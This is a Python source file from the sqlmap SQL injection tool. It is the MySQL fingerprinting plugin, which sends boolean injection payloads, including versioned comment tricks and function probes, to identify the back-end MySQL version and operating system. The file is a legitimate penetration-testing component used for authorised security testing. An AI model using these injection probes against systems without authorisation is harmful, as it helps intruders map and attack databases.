#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.common import Backend
from lib.core.common import Format
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import MYSQL_ALIASES
from lib.core.settings import UNKNOWN_DBMS_VERSION
from lib.request import inject
from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.MYSQL)

    def __commentCheck(self):
        infoMsg = "executing %s comment injection fingerprint" % DBMS.MYSQL
        logger.info(infoMsg)

        randInt = randomInt()
        result = inject.checkBooleanExpression("%d=%d/* NoValue */" % (randInt, randInt))

        if not result:
            warnMsg = "unable to perform %s comment injection" % DBMS.MYSQL
            logger.warn(warnMsg)

            return None

        # MySQL valid versions updated on 04/2011
        versions = (
                     (32200, 32235),    # MySQL 3.22
                     (32300, 32359),    # MySQL 3.23
                     (40000, 40032),    # MySQL 4.0
                     (40100, 40131),    # MySQL 4.1
                     (50000, 50092),    # MySQL 5.0
                     (50100, 50156),    # MySQL 5.1
                     (50400, 50404),    # MySQL 5.4
                     (50500, 50511),    # MySQL 5.5
                     (60000, 60014),    # MySQL 6.0
                   )

        index = -1
        for i in xrange(len(versions)):
            element = versions[i]
            version = element[0]
            randInt = randomInt()
            version = getUnicode(version)
            result = inject.checkBooleanExpression("%d=%d/*!%s AND %d=%d*/" % (randInt, randInt, version, randInt, randInt + 1))

            if result:
                break
            else:
                index += 1

        if index >= 0:
            prevVer = None

            for version in xrange(versions[index][0], versions[index][1] + 1):
                randInt = randomInt()
                version = getUnicode(version)
                result = inject.checkBooleanExpression("%d=%d/*!%s AND %d=%d*/" % (randInt, randInt, version, randInt, randInt + 1))

                if result:
                    if not prevVer:
                        prevVer = version

                    if version[0] == "3":
                        midVer = prevVer[1:3]
                    else:
                        midVer = prevVer[2]

                    trueVer = "%s.%s.%s" % (prevVer[0], midVer, prevVer[3:])

                    return trueVer

                prevVer = version

        return None

    def getFingerprint(self):
        value = ""
        wsOsFp = Format.getOs("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "
        actVer = Format.getDbms()

        if not conf.extensiveFp:
            value += actVer
            return value

        comVer = self.__commentCheck()
        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if comVer:
            comVer = Format.getDbms([comVer])
            value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = Format.getDbms([banVer] if banVer else None)
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html (up to 5.0.89)
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html (up to 5.1.42)
        * http://dev.mysql.com/doc/refman/5.4/en/news-5-4-x.html (up to 5.4.4)
        * http://dev.mysql.com/doc/refman/5.5/en/news-5-5-x.html (up to 5.5.0)
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html (manual has been withdrawn)
        """

        if not conf.extensiveFp and (Backend.isDbmsWithin(MYSQL_ALIASES) \
           or conf.dbms in MYSQL_ALIASES) and Backend.getVersion() and \
           Backend.getVersion() != UNKNOWN_DBMS_VERSION:
            v = Backend.getVersion().replace(">", "")
            v = v.replace("=", "")
            v = v.replace(" ", "")

            Backend.setVersion(v)

            setDbms("%s %s" % (DBMS.MYSQL, Backend.getVersion()))

            if Backend.isVersionGreaterOrEqualThan("5"):
                kb.data.has_information_schema = True

            self.getBanner()

            return True

        infoMsg = "testing %s" % DBMS.MYSQL
        logger.info(infoMsg)

        randInt = getUnicode(randomInt(1))
        result = inject.checkBooleanExpression("CONNECTION_ID()=CONNECTION_ID()")

        if result:
            infoMsg = "confirming %s" % DBMS.MYSQL
            logger.info(infoMsg)

            result = inject.checkBooleanExpression("USER()=USER()")

            if not result:
                warnMsg = "the back-end DBMS is not %s" % DBMS.MYSQL
                logger.warn(warnMsg)

                return False

            # reading information_schema on some platforms is causing annoying timeout exits
            # Reference: http://bugs.mysql.com/bug.php?id=15855

            # Determine if it is MySQL >= 5.0.0
            if inject.checkBooleanExpression("ISNULL(TIMESTAMPADD(MINUTE,%s,%s))" % (randInt, randInt)):
                kb.data.has_information_schema = True
                Backend.setVersion(">= 5.0.0")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

                if not conf.extensiveFp:
                    return True

                infoMsg = "actively fingerprinting %s" % DBMS.MYSQL
                logger.info(infoMsg)

                # Check if it is MySQL >= 5.5.0
                if inject.checkBooleanExpression("TO_SECONDS(950501)>0"):
                    Backend.setVersion(">= 5.5.0")

                # Check if it is MySQL >= 5.1.2 and < 5.5.0
                elif inject.checkBooleanExpression("@@table_open_cache=@@table_open_cache"):
                    if inject.checkBooleanExpression("%s=(SELECT %s FROM information_schema.GLOBAL_STATUS LIMIT 0, 1)" % (randInt, randInt)):
                        Backend.setVersionList([">= 5.1.12", "< 5.5.0"])
                    elif inject.checkBooleanExpression("%s=(SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1)" % (randInt,randInt)):
                        Backend.setVersionList([">= 5.1.7", "< 5.1.12"])
                    elif inject.checkBooleanExpression("%s=(SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1)" % (randInt, randInt)):
                        Backend.setVersion("= 5.1.6")
                    elif inject.checkBooleanExpression("%s=(SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1)" % (randInt, randInt)):
                        Backend.setVersionList([">= 5.1.5", "< 5.1.6"])
                    else:
                        Backend.setVersionList([">= 5.1.2", "< 5.1.5"])

                # Check if it is MySQL >= 5.0.0 and < 5.1.2
                elif inject.checkBooleanExpression("@@hostname=@@hostname"):
                    Backend.setVersionList([">= 5.0.38", "< 5.1.2"])
                elif inject.checkBooleanExpression("@@character_set_filesystem=@@character_set_filesystem"):
                    Backend.setVersionList([">= 5.0.19", "< 5.0.38"])
                elif not inject.checkBooleanExpression("%s=(SELECT %s FROM DUAL WHERE %s!=%s)" % (randInt, randInt, randInt, randInt)):
                    Backend.setVersionList([">= 5.0.11", "< 5.0.19"])
                elif inject.checkBooleanExpression("@@div_precision_increment=@@div_precision_increment"):
                    Backend.setVersionList([">= 5.0.6", "< 5.0.11"])
                elif inject.checkBooleanExpression("@@automatic_sp_privileges=@@automatic_sp_privileges"):
                    Backend.setVersionList([">= 5.0.3", "< 5.0.6"])
                else:
                    Backend.setVersionList([">= 5.0.0", "< 5.0.3"])

            # For cases when information_schema is missing
            elif inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                Backend.setVersion(">= 5.0.2")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

            elif inject.checkBooleanExpression("STRCMP(LOWER(CURRENT_USER()), UPPER(CURRENT_USER()))=0"):
                Backend.setVersion("< 5.0.0")
                setDbms("%s 4" % DBMS.MYSQL)
                self.getBanner()

                if not conf.extensiveFp:
                    return True

                # Check which version of MySQL < 5.0.0 it is
                if inject.checkBooleanExpression("3=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.11", "< 5.0.0"])
                elif inject.checkBooleanExpression("2=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.1", "< 4.1.11"])
                elif inject.checkBooleanExpression("CURRENT_USER()=CURRENT_USER()"):
                    Backend.setVersionList([">= 4.0.6", "< 4.1.1"])

                    if inject.checkBooleanExpression("'utf8'=(SELECT CHARSET(CURRENT_USER()))"):
                        Backend.setVersion("= 4.1.0")
                    else:
                        Backend.setVersionList([">= 4.0.6", "< 4.1.0"])
                else:
                    Backend.setVersionList([">= 4.0.0", "< 4.0.6"])
            else:
                Backend.setVersion("< 4.0.0")
                setDbms("%s 3" % DBMS.MYSQL)
                self.getBanner()

            return True
        else:
            warnMsg = "the back-end DBMS is not %s" % DBMS.MYSQL
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("'W'=UPPER(MID(@@version_compile_os,1,1))")

        if result:
            Backend.setOs(OS.WINDOWS)
        elif not result:
            Backend.setOs(OS.LINUX)

        if Backend.getOs():
            infoMsg = "the back-end DBMS operating system is %s" % Backend.getOs()
            logger.info(infoMsg)
        else:
            self.userChooseDbmsOs()

        self.cleanup(onlyFileTbl=True)
